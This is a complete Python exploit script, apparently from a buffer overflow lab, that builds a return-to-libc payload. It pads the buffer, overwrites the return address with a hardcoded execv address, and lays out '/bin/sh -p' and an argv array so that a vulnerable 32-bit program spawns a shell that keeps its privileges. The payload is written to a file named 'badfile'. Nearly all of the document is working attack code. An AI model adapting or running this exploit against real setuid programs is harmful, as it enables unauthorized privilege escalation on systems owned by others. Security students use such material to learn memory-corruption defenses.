from struct import pack

def p32(n):
    return pack('<I', n)

input_addr = 0xffffcce0
execv_addr = 0xf7ea9410
exits_addr = 0xf7e1b060

offset = 0
input_length = 0x18 + 4
binsh_offset = 0
pflag_offset = 0

payload = input_length * b'A'; offset += input_length 

payload += p32(execv_addr); offset += 4 # return address
payload += p32(exits_addr); offset += 4 # second return address
payload += p32(0xEEEEEEEE); offset += 4 # argv1
payload += p32(0xDDDDDDDD); offset += 4 # argv2

payload += b'/bin/sh\x00';  binsh_offset = offset; offset += len(b'/bin/sh\x00')
payload += b'-p\x00';       pflag_offset = offset; offset += len(b'-p\x00')

while len(payload) % 4 != 0:
    payload += b'\x00'
    offset += 1

argv_array = input_addr + offset
binsh_addr = input_addr + binsh_offset # address of "/bin/sh"
pflag_addr = input_addr + pflag_offset # address of "-p"

payload += p32(binsh_addr) # argv array
payload += p32(pflag_addr) # argv array
payload += p32(0x00000000) # argv array

payload = payload.replace(p32(0xEEEEEEEE), p32(binsh_addr))
payload = payload.replace(p32(0xDDDDDDDD), p32(argv_array))

with open('badfile', 'wb') as f:
    f.write(payload)
    f.close()
    print('[+] Voila!')